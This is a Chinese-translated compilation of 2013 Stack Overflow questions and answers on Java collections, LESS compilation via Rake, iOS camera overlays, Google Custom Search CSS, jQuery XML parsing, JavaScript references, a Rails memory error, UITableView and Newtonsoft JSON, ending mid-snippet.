## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T06:30:02.480

在这条线上

```
 map.put( KEY_TITLE,((Element)nl.item(i)).getAttribute("name")); 
```

您正在添加单个字符串而不是 List

您必须在该点创建一个字符串列表并将您的字符串添加到它并在列表中添加到您的地图。

**例如：**

```
 List<String> myList= new ArrayList<String>();
  myList.add((Element)nl.item(i)).getAttribute("name"));
  map.put( KEY_TITLE,myList); 
```

你有一个循环。我想我知道你想要实现什么我会更新我的代码。这可以帮助您避免覆盖地图输入

```
HashMap<String, List<String>> map = new HashMap<String, List<String>>();

        for(int i = 0; i < nl.getLength(); i++) {
             String name = (Element) nl.item(i)).getAttribute("name");
             populateMap(map, name, KEY_TITLE);
            for(int j = 0; j < nl1.getLength(); j++) {
                String title=(Element) nl1.item(j)).getAttribute("title");
                populateMap(map, title, KEY_ARTICLE);

                String url=(Element) nl2.item(j)).getAttribute("url");
                populateMap(map, url, KEY_IMAGE);
            }
            songsList.add(map);
        } 
```

方法 populateMap()

```
void populateMap(HashMap<String, List<String>> map, String value, String key) {
        List<String> myList;
        if(!map.containsKey(key)) {
            myList = new ArrayList<String>();
            myList.add(value);
            map.put(key, myList);
        } else {
            myList = map.get(key);
            myList.add(value);
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:29:40.180

你得到那个错误是因为 a`String`不是 a`List<String>.`

将您的地图声明更改为`HashMap<String, String>`或将您的声明包含在`String`a`List<String>`中并将其提供给该方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T06:29:47.390

您传递的密钥是错误的。你传入一个字符串，你需要传入一个字符串列表。因此，创建一个列表，将您尝试传递到哈希映射中的值粘贴到列表中，然后将该列表放入哈希映射中。

# node.js - 如何在 Windows 环境中从 Rake 任务调用 Nodejs 来编译一些 LESS 文件？

> ID：15738661
> 
> 赞同：1
> 
> 时间：2013-04-01T06:25:17.027
> 
> 标签：node.js, rake, less, albacore

从 Rake 任务调用 nodejs 的正确方法是什么？我想将一些 LESS 文件编译成 CSS。我已经全局安装了 cssless 编译器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-07T19:24:23.373

使用 lessc 命令调用的命令行 Less 编译器应该可以工作。

您可以从安装 Less 的 Ruby 版本开始，这使得 Less 编译器可用于 Ruby：`sudo gem install less`

请注意，如果要使此编译器正常工作，您还必须安装 ruby​​racer ( `sudo gem install therubyracer`)（当您将编译器替换为节点版本时不需要）。

现在您应该能够运行以下命令：`lessc -v`. 这应该`lessc 1.7.0 (LESS Compiler) [Ruby] 2.6.0`向控制台输出类似的内容。

在这些步骤之后，您可以运行`npm install -g less`它将安装 Node Less 编译器（并替换 Ruby 编译器，这两个命令都将可执行文件安装在同一位置）。现在该`lessc -v`命令应该将以下内容输出到控制台`lessc 1.7.5 (Less Compiler) [JavaScript]`

最后你可以创建一个 Rake 任务来编译 Less。可以在以下位置找到此类任务的示例：[https](https://gist.github.com/pfig/1969062) ://gist.github.com/pfig/1969062 ，如下所示：

```
require 'rubygems'
require 'less'
require 'rake'

SOURCE = "."
LESS = File.join( SOURCE, "path", "to", "less", "files" )
CONFIG = {
  'less'   => File.join( LESS, "less" ),
  'css'    => File.join( LESS, "css" ),
  'input'  => "style.less",
  'output' => "style.css"
}

desc "Compile Less"
task :lessc do
  less   = CONFIG['less']

  input  = File.join( less, CONFIG['input'] )
  output = File.join( CONFIG['css'], CONFIG['output'] )

  source = File.open( input, "r" ).read

  parser = Less::Parser.new( :paths => [less] )
  tree = parser.parse( source )

  File.open( output, "w+" ) do |f|
    f.puts tree.to_css( :compress => true )
  end
end # task :lessc 
```

# c# - 除了查询字符串之外，还有哪些选项可以在位于不同服务器的页面之间传递大量数据

> ID：15738664
> 
> 赞同：1
> 
> 时间：2013-04-01T06:25:21.443
> 
> 标签：c#, asp.net, html, query-string

我的一个客户有两台服务器。一个启用了 asp.net，而其他服务器只是静态的。在静态服务器上只有 html 文件。现在客户希望在静态服务器上有一个页面用于maling。由于静态服务器上没有可用的服务器端脚本，我在 html 中创建了一个页面，该页面在提交时使用 javascript 创建一个带有提交字段的查询字符串。此查询字符串被传递到位于不同服务器上的 aspx 页面，在该页面中，用户被要求输入用户名和密码。

一切都很好，但是当数据很大时，查询字符串就会被忽略。由于用户可以一次性提交的数据没有上限，因此 90% 的时间我都会出错。

我在 web.config 中包含了以下行，但没有成功。

```
<httpRuntime maxRequestLength="32768" executionTimeout="32768"/> 
```

有没有其他方法可以通过服务器传递数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T08:06:10.070

通过请求 url 发布数据是一个不错的选择，这里是一个例子

[http://andreaazzola.com/post/post-data-js](http://andreaazzola.com/post/post-data-js)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:28:28.627

您可以改为发送发布请求，并将您的数据发布到表单字段中。

# iphone - 无法捕获叠加图像

> ID：15738666
> 
> 赞同：0
> 
> 时间：2013-04-01T06:25:49.153
> 
> 标签：iphone, camera, overlay, avfoundation, avcapturesession

我有 3 张图片。我一一加载到相机叠加图像。然后我需要拍摄快照。但是当我单击按钮时，它会拍摄特定图像的快照。当我将 imageName.png 放入 captureStillImageWithOverlay 时，它只拍摄该图像的快照，当叠加层中存在时它不会拍摄其他图像

按钮点击代码：

```
- (void)ButtonPressed {

  [[self captureManager] captureStillImageWithOverlay:[UIImage imageNamed:@"img2.png"]];

  } 
```

加载图像：

```
-(void)loadNextPage:(int)index
{

    int countFlag=0;
    for(int i=index*4;i<(index+1)*4;i++)
    {
        UIButton *imageView=[[UIButton alloc]initWithFrame:CGRectMake((320*index)+countFlag*80+ 2, 5, 75, 75)];
        imageView.tag=i+1;
        [imageView addTarget:self action:@selector(imageViewClicked:) forControlEvents:UIControlEventTouchUpInside];
        [imageView.layer setBorderColor:[UIColor lightGrayColor].CGColor];
        [imageView.layer setBorderWidth:1.0f];
        switch ((i+1)%5) {
            case 0:
                [imageView setImage:[UIImage imageNamed:@"img1.png"] forState:UIControlStateNormal];

                break;

            case 1:
                [imageView setImage:[UIImage imageNamed:@"img2.png"]  forState:UIControlStateNormal];

                break;

            case 2:
                [imageView setImage:[UIImage imageNamed:@"img3.png"]  forState:UIControlStateNormal];
                break;

}

        [myScrollView addSubview:imageView];

        [imageView release];
        countFlag++;
    }
} 
```

捕获叠加图像：

```
- (void)captureStillImageWithOverlay:(UIImage*)overlay
{
    AVCaptureConnection *videoConnection = nil;
    for (AVCaptureConnection *connection in [[self stillImageOutput] connections]) {
        for (AVCaptureInputPort *port in [connection inputPorts]) {
            if ([[port mediaType] isEqual:AVMediaTypeVideo]) {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection) {
            break;
        }
    }

    NSLog(@"about to request a capture from: %@", [self stillImageOutput]);

 [[self stillImageOutput] captureStillImageAsynchronouslyFromConnection:videoConnection
                                                         completionHandler:^(CMSampleBufferRef imageSampleBuffer, NSError *error) {
                                                             CFDictionaryRef exifAttachments = CMGetAttachment(imageSampleBuffer, kCGImagePropertyExifDictionary, NULL);
                                                             if (exifAttachments) {
                                                                 NSLog(@"attachements: %@", exifAttachments);
                                                             } else {
                                                                 NSLog(@"no attachments");
                                                             }

                                                             NSData *imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
                                                             UIImage *image = [[UIImage alloc] initWithData:imageData];

                                                             CGSize imageSize = [image size];
                                                             CGSize overlaySize = [overlay size];

                                                             UIGraphicsBeginImageContext(imageSize);

                                                             [image drawInRect:CGRectMake(0, 0, imageSize.width, imageSize.height)];

                                                             CGFloat xScaleFactor = imageSize.width / 320;
                                                             CGFloat yScaleFactor = imageSize.height / 480;

                                                             [overlay drawInRect:CGRectMake(30 * xScaleFactor, 100 * yScaleFactor, overlaySize.width * xScaleFactor, overlaySize.height * yScaleFactor)]; // rect used in AROverlayViewController was (30,100,260,200)

                                                             UIImage *combinedImage = UIGraphicsGetImageFromCurrentImageContext();

                                                             [self setStillImage:combinedImage];

                                                             UIGraphicsEndImageContext();

                                                             [image release];
                                                             [[NSNotificationCenter defaultCenter] postNotificationName:kImageCapturedSuccessfully object:nil];

                                                     }];

} 
```

我从这个网址[[http://www.musicalgeometry.com/?p=1681]](http://www.musicalgeometry.com/?p=1681)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:27:39.967

叠加层仅用于在相机选择器中展示。

您还需要在保存到磁盘的最终 UIImage（JPEG 或 TIFF 或其他）中组合这些图像。

[其他人已经（并已解决）与您相同的问题](https://stackoverflow.com/questions/11262495/issue-on-merging-the-overlay-image-with-capture-image-ios)。

编辑，这里有一些代码*可以*帮助你：

```
- (void)captureStillImageWithOverlay:(NSArray *) arrayOfImageFiles
{
    AVCaptureConnection *videoConnection = nil;
    for (AVCaptureConnection *connection in [[self stillImageOutput] connections]) {
        for (AVCaptureInputPort *port in [connection inputPorts]) {
            if ([[port mediaType] isEqual:AVMediaTypeVideo]) {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection) {
            break;
        }
    }

    NSLog(@"about to request a capture from: %@", [self stillImageOutput]);

 [[self stillImageOutput] captureStillImageAsynchronouslyFromConnection:videoConnection
                                                         completionHandler:^(CMSampleBufferRef imageSampleBuffer, NSError *error) {
                                                             CFDictionaryRef exifAttachments = CMGetAttachment(imageSampleBuffer, kCGImagePropertyExifDictionary, NULL);
                                                             if (exifAttachments) {
                                                                 NSLog(@"attachements: %@", exifAttachments);
                                                             } else {
                                                                 NSLog(@"no attachments");
                                                             }

                                                             NSData *imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
                                                             UIImage *image = [[UIImage alloc] initWithData:imageData];

                                                             CGSize imageSize = [image size];

                                                             UIGraphicsBeginImageContext(imageSize);

                                                             [image drawInRect:CGRectMake(0, 0, imageSize.width, imageSize.height)];

                                                             CGFloat xScaleFactor = imageSize.width / 320;
                                                             CGFloat yScaleFactor = imageSize.height / 480;

                                                             for(NSString * imageFileName in arrayOfImageFiles)
                                                             {
                                                                 // images named @"img1" or @"img1.png" should work
                                                                 UIImage * overlay = [UIImage imageNamed: imageFileName];
                                                                 if(overlay)
                                                                 {
                                                                     CGSize overlaySize = [overlay size];

                                                                     [overlay drawInRect:CGRectMake(30 * xScaleFactor, 100 * yScaleFactor, overlaySize.width * xScaleFactor, overlaySize.height * yScaleFactor)]; // rect used in AROverlayViewController was (30,100,260,200)
                                                                 } else {
                                                                     NSLog( @"could not find an image named %@", imageFileName);
                                                                 }
                                                             }

                                                             UIImage *combinedImage = UIGraphicsGetImageFromCurrentImageContext();

                                                             [self setStillImage:combinedImage];

                                                             UIGraphicsEndImageContext();

                                                             [image release];
                                                             [[NSNotificationCenter defaultCenter] postNotificationName:kImageCapturedSuccessfully object:nil];

                                                     }];

} 
```

# search - 覆盖 google 自定义搜索 css

> ID：15738670
> 
> 赞同：1
> 
> 时间：2013-04-01T06:26:30.067
> 
> 标签：search, google-custom-search

在我的网站上有谷歌自定义搜索。我对搜索结果的字体有疑问。我需要**Arial,sans-serif**。

这是我的谷歌搜索代码。

```
<div id="cse-search-results"></div>
<script type="text/javascript">
  var googleSearchIframeName = "cse-search-results";
  var googleSearchFormName = "cse-search-box";
  var googleSearchFrameWidth = 600;
  var googleSearchDomain = "www.google.com";
  var googleSearchPath = "/cse";
</script>
<script type="text/javascript" src="http://www.google.com/afsonline/show_afs_search.js"></script> 
```

这是我的 css 来自谷歌。

```
.gsc-control-cse .gsc-table-result {
    font-family: font;
}
.gsc-control-cse, .gsc-control-cse .gsc-table-result {
    font-family: Arial,sans-serif;
    font-size: 13px;
} 
```

.gsc-control-cse .gsc-table-result 这个类被覆盖了下面类的字体系列。

帮我解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-29T09:04:38.820

谢谢柠檬滴效果很好我改变了

```
.gs-result .gs-title,
.gs-result .gs-title * {
    color: black;
    text-decoration: none; 
    font-family: 'PT Sans Caption', Tahoma, sans-serif; 
} 
```

到

```
.gs-result .gs-title,
.gs-result .gs-title * {
    color: black !important;
    text-decoration: none !important; 
    font-family: 'PT Sans Caption', Tahoma, sans-serif !important;

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:39:47.253

我没有研究过 CSS，但我认为你正在遵循一个非常古老的例子。谷歌现在有一个可定制的搜索引擎创建器，您可以在其中为每个元素指定所需的颜色和字体

看![图片](https://i.stack.imgur.com/a7QFe.png)

此外，您可以使用上下文 XML 文件在代码中定义它，其详细信息可在“[外观”部分中找到](https://developers.google.com/custom-search/docs/ui_xml)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:33:20.503

如果我理解正确，你不能只使用 !important 来覆盖你想要覆盖的那个：

```
font-family: Arial,sans-serif !important; 
```

# jquery - 如何从xml加载所有属性值

> ID：15738671
> 
> 赞同：0
> 
> 时间：2013-04-01T06:26:30.960
> 
> 标签：jquery, xml

这是我的**arty.xml**：

```
<child_2 entity_id="2" value="Root" parent_id="1">
    <child_4 entity_id="4" value="Activities" parent_id="2">
        <child_10066 entity_id="10066" value="Physical1" parent_id="4">
            <child_10067 entity_id="10067" value="Cricket" parent_id="10066">
                <child_10068 entity_id="10068" value="One Day" parent_id="10067"/>
            </child_10067>
        </child_10066>
        <child_10069 entity_id="10069" value="Test2" parent_id="4"/>
        <child_10070 entity_id="10070" value="Test3" parent_id="4"/>
        <child_10071 entity_id="10071" value="Test4" parent_id="4"/>
        <child_10072 entity_id="10072" value="Test5" parent_id="4"/>
        <child_5 entity_id="5" value="Physical" parent_id="4"/>
    </child_4>
</child_2> 
```

这是我尝试阅读它：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<link rel="stylesheet" type="text/css" media="all" href="style.css" />
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js"></script>
<script type="text/javascript" src="jquery.js"></script>
<title>Using jQuery and XML to populate a drop-down box demo</title>
<script>
$(document).ready(function(){
    $.ajax({
    type: "GET",
    url: "atry.xml",
    dataType: "xml",
    success: function(xml) {
    var select = $('#mySelect');

    $(xml).find('child_2').each(function(){
    $(this).find('child_4').each(function(){
    var value = $(this).attr('value');
    select.append("<option class='ddindent' value='"+ value +"'>"+value+"</option>");
        });
    });
        select.children(":first").text("Select").attr("selected",true);
} //sucess close
}); 
}); 
</script>
</head>
<body>    <div id="page-wrap">
<select id="mySelect">
<option>loading</option>
</select>
</div>
</body>
</html> 
```

在这里，我正在尝试加载所有属性值并创建选择列表...

但问题是我没有得到所有孩子的价值观......

帮我摆脱这个...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:45:02.527

嗨，我在本地测试过它工作正常

可能是您的问题是您正在使用 $(this).attr('value');

所以你可以这样尝试

```
$(document).ready(function(){
        $.ajax({
        type: "GET",
        url: "atry.xml",
        dataType: "xml",
        success: function(xml) {
        var select = $('#mySelect');

         $(xml).find('child_2').each(function(){
         var value = $(this).find('child_4').attr('value');
         select.append("<option class='ddindent' value='"+ value +"'>"+value+"</option>");
          });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:39:59.693

您可以像这样获取所有子标签值。

```
 $(document).ready(function(){
        $("xml").find('child_2').each(function(){
        $(this).children().map(function(){
            $("#mySelect").append("<option class='ddindent' >"+$(this).attr('value')+"</option>");

            var tag = this.tagName;

            $(tag).children().map(function(){
                //alert("alert : " + this.tagName + " value : " + $(this).attr("value"));
                $("#mySelect").append("<option class='ddindent' >"+$(this).attr('value')+"</option>");
            });
            });
        });
            //select.children(":first").text("Select").attr("selected",true);
    } //sucess close

    ); 
    </script> 
```

希望它对你有帮助:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:36:31.027

我认为你不必再次循环，你可以试试这个：

```
$(xml).find('child_2').each(function(){
   $(this).find('child_4').children().find('[entity_id]').each(function(){
       var value = $(this).attr('value');
       select.append("<option class='ddindent' value='"+ value +"'>"+value+"</option>");
   });
}); 
```

# javascript - Javascript 复制语义

> ID：15738684
> 
> 赞同：1
> 
> 时间：2013-04-01T06:28:01.633
> 
> 标签：javascript, copy, semantics

以下是正常的 javascript 语义：

```
js> a={'a':{'red':12,'green':23,'blue':34}}
({a:{red:12, green:23, blue:34}})
js> b=a['a']                                                                    
({red:12, green:23, blue:34})
js>b={red:122, green:232, blue:142}                                                                        
({red:122, green:232, blue:142})
js> a
({a:{red:12, green:23, blue:34})
js> 
```

以下是我想要的语义：

```
js> a={'a':{'red':12,'green':23,'blue':34}}
({a:{red:12, green:23, blue:34}})
js> b=a['a']                                                                    
({red:12, green:23, blue:34})
js>b={red:122, green:232, blue:142}                                                                        
({red:122, green:232, blue:142})
js> a
({red:122, green:232, blue:142})
js> 
```

是否有任何简单的内部技巧可以让 javascript 以我的方式行事？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:41:44.687

Javascript 没有“指向引用的指针”类型。但是，您可以创建“对象的属性”类型（对象、属性名称；不能指向局部变量）。

```
a={'a':{'red':12,'green':23,'blue':34}}
//({a:{red:12, green:23, blue:34}})
b={obj:a, key:"a"}
b.obj[b.key]                                                             
//({red:12, green:23, blue:34})
b.obj[b.key]={red:122, green:232, blue:142}                                                                        
//({red:122, green:232, blue:142})
a
//({a:{red:122, green:232, blue:142}}) 
```

或者，您可以覆盖对象`b`指的是：

```
a={'a':{'red':12,'green':23,'blue':34}}
//({a:{red:12, green:23, blue:34}})
b=a['a'] //or a.a
//({red:12, green:23, blue:34})
b.red = 122;
b.green = 232;
b.blue = 142;
b
//({red:122, green:232, blue:142})
a
//({a:{red:122, green:232, blue:142}}) 
```

# ruby-on-rails - 如何解决rails中内存分配的错误？

> ID：15738685
> 
> 赞同：2
> 
> 时间：2013-04-01T06:28:02.523
> 
> 标签：ruby-on-rails, memory-management, passenger

我正在尝试加载部署在服务器中的 rails 3.2 应用程序。我收到以下错误：

错误信息：

```
/usr/local/rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/i686-linux/digest/md5.so: failed to map segment from shared object: Cannot allocate memory - /usr/local/rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/i686-linux/digest/md5.so 
```

异常类：

```
LoadError 
```

回溯：

```
#   File    Line    Location

    0   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/activesupport-3.2.11/lib/active_support/dependencies.rb   251     in `require'
    1   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/activesupport-3.2.11/lib/active_support/dependencies.rb   251     in `block in require'
    2   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/activesupport-3.2.11/lib/active_support/dependencies.rb   236     in `load_dependency'
    3   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/activesupport-3.2.11/lib/active_support/dependencies.rb   251     in `require'
    4   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/actionpack-3.2.11/lib/action_dispatch/http/response.rb    1   in `'
    5   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/actionpack-3.2.11/lib/action_dispatch/railtie.rb  25  in `block in '
    6   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/railties-3.2.11/lib/rails/initializable.rb    30  in `instance_exec'
    7   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/railties-3.2.11/lib/rails/initializable.rb    30  in `run'
    8   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/railties-3.2.11/lib/rails/initializable.rb    55  in `block in run_initializers'
    9   /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/railties-3.2.11/lib/rails/initializable.rb    54  in `each'
    10  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/railties-3.2.11/lib/rails/initializable.rb    54  in `run_initializers'
    11  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/railties-3.2.11/lib/rails/application.rb  136     in `initialize!'
    12  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/railties-3.2.11/lib/rails/railtie/configurable.rb     30  in `method_missing'
    13  /var/www/PCMI/zil/config/environment.rb     5   in `'
    14  config.ru   3   in `require'
    15  config.ru   3   in `block in '
    16  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/rack-1.4.5/lib/rack/builder.rb    51  in `instance_eval'
    17  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/rack-1.4.5/lib/rack/builder.rb    51  in `initialize'
    18  config.ru   1   in `new'
    19  config.ru   1   in `'
    20  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/rack/application_spawner.rb    225     in `eval'
    21  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/rack/application_spawner.rb    225     in `load_rack_app'
    22  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/rack/application_spawner.rb    157     in `block in initialize_server'
    23  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/utils.rb   563     in `report_app_init_status'
    24  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/rack/application_spawner.rb    154     in `initialize_server'
    25  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/abstract_server.rb     204     in `start_synchronously'
    26  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/abstract_server.rb     180     in `start'
    27  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/rack/application_spawner.rb    129     in `start'
    28  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/spawn_manager.rb   253     in `block (2 levels) in spawn_rack_application'
    29  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/abstract_server_collection.rb  132     in `lookup_or_add'
    30  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/spawn_manager.rb   246     in `block in spawn_rack_application'
    31  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/abstract_server_collection.rb  82  in `block in synchronize'
    32  < td=""> <> prelude>    10:in `synchronize'
    33  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/abstract_server_collection.rb  79  in `synchronize'
    34  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/spawn_manager.rb   244     in `spawn_rack_application'
    35  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/spawn_manager.rb   137     in `spawn_application'
    36  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/spawn_manager.rb   275     in `handle_spawn_application'
    37  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/abstract_server.rb     357     in `server_main_loop'
    38  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/lib/phusion_passenger/abstract_server.rb     206     in `start_synchronously'
    39  /usr/local/rvm/gems/ruby-1.9.3-p125@test.org/gems/passenger-3.0.17/helper-scripts/passenger-spawn-server    99  in `' 
```

我必须做些什么来解决这个错误？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-03-19T14:33:23.323

我遇到了同样的问题，发现机器内存不足（RAM）。您可以通过在 Linux shell 上运行以下命令来确认它：

`free -h`

# iphone - UITableView 中的错误 [IRForTarget]

> ID：15738688
> 
> 赞同：2
> 
> 时间：2013-04-01T06:28:26.170
> 
> 标签：iphone, uitableview

我在视图控制器中有多个表视图，它给出了错误。我不知道哪里出了问题，任何人都可以指导。数据未显示在表格视图中，但数组在控制台中打印时有数据，我尝试不使用数组也向 cell.textLabel.text 提供静态数据，但未显示在表格视图中，检查的行数在那里没有问题。控制不去 cell.textLabel.text，我没有得到什么是错的。请指导以上。下面是代码：

```
-(UITableViewCell *) tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
static NSString *CellIdentifier = @"Cell";
UITableViewCell *cell;

if(tableView == self.mLocationTable)
{
    cell = [self.mLocationTable dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil)
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    else{
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    // if([self.mLocShowArr count]!= 0)
    // {
    //  NSString *str = [self.mLocShowArr objectAtIndex:indexPath.row];
    cell.textLabel.text = @"locations";
    // NSLog(@"show loc:%@", [self.mLocShowArr objectAtIndex:0]);
    //  }

}

if(tableView == self.mNotifyTable)
{
    cell = [self.mNotifyTable dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil)
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    UIImage *yourImage = [UIImage imageNamed:@"emma-watson-02.jpg"];
    UIImageView *imageViewToPutInCell = [[UIImageView alloc] initWithImage:yourImage];
    imageViewToPutInCell.frame = CGRectMake(5, 8, 55, 55);

    UILabel *cellTextLabel = [[UILabel alloc]initWithFrame:CGRectMake(68, 10, 200, 40)];
    cellTextLabel.text = @"notification view";

    [cell addSubview:imageViewToPutInCell];
    [cell addSubview:cellTextLabel];

}
} 
```

这是完整的错误：错误 [IRForTarget]：调用目标中不存在的仅符号函数“objc_msgSend”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:43:27.630

要检查的东西。

1.  所有需要实现的数据源方法
2.  `- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section` 记录返回值并确保它不为 0
3.  为不同的表格提供不同的单元格标识符
4.  确保表数据源和委托在 nib 中连接

[此处的](https://stackoverflow.com/questions/9983192/weird-error-message-in-xcode-4-3-with-lldb)错误说明

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:53:37.320

试试这个代码！！！在您的代码中，您错过了“返回单元格；”

```
-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
static NSString *CellIdentifier = @"Cell";
UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (cell == nil) {
    cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier] autorelease];
    cell.selectionStyle = UITableViewCellSelectionStyleBlue;
    cell.accessoryType = UITableViewCellAccessoryNone;
}
    if(tableView == self.mNotifyTable) {
      cell.textLabel.text = @"locations";

      UIImage *yourImage = [UIImage imageNamed:@"emma-watson-02.jpg"];
      UIImageView *imageViewToPutInCell = [[UIImageView alloc] initWithImage:yourImage];
      imageViewToPutInCell.frame = CGRectMake(5, 8, 55, 55);

      UILabel *cellTextLabel = [[UILabel alloc]initWithFrame:CGRectMake(68, 10, 200, 40)];
      cellTextLabel.text = @"notification view";

      [cell addSubview:imageViewToPutInCell];
      [cell addSubview:cellTextLabel];
   }
   return cell;
} 
```

希望这能解决你的问题！！！

如果对你有帮助，请采纳！！！

# json - 牛顿软件 JSON

> ID：15738691
> 
> 赞同：6
> 
> 时间：2013-04-01T06:28:34.777
> 
> 标签：json, asp.net-mvc-4

我创建了一个新的 MVC4 应用程序，默认情况下将 Newton JSON 添加到包中。

我读到它对于序列化和反序列化 JSON 很有用。这就是它的全部吗？

默认情况下，我们可以使用 JSONResult 在 MVC 中发送 JSON。并在 JQuery 中使用 Stringify 我可以在 C# 中作为一个类接收。

我知道他们添加牛顿 JSON 应该有一些原因。

由于我是 MVC 的新手并开始新项目，所以想知道一些关于哪个序列化/反序列化的见解？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T06:35:40.047

他们添加了 Newtonsoft，以便您的 WebAPI 控制器可以神奇地序列化您返回的对象。在 MVC 3 中，我们曾经像这样返回我们的对象：

```
public ActionResult GetPerson(int id)
{
    var person = _personRepo.Get(id);
    return Json(person);
} 
```

在**Web API**项目中，您可以返回 person，它将为您序列化：

```
public Person GetPerson(int id)
{
    var person = _personRepo.Get(id);
    return person
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:37:07.090

使用 JsonResult 并返回`Json(yourObject)`post 操作，或者`Json(yourObject, JsonRequestBehavior.AllowGet)`如果您正在执行 GET 操作。

如果您想使用 Newton Json.NET 反序列化 Json，请查看[http://www.hanselman.com/blog/NuGetPackageOfTheWeek4DeserializingJSONWithJsonNET.aspx](http://www.hanselman.com/blog/NuGetPackageOfTheWeek4DeserializingJSONWithJsonNET.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-10T09:47:27.857

如果您的项目只是一个没有 WebApi 的 MVC 项目，则`Newtonsoft.Json`不会添加返回`JsonResults`，因为`JsonResult`MVC 返回的使用`JavaScriptSerializer`如下：

```
 public override void ExecuteResult(ControllerContext context)
        {
            if (context == null)
            {
                throw new ArgumentNullException("context");
            }
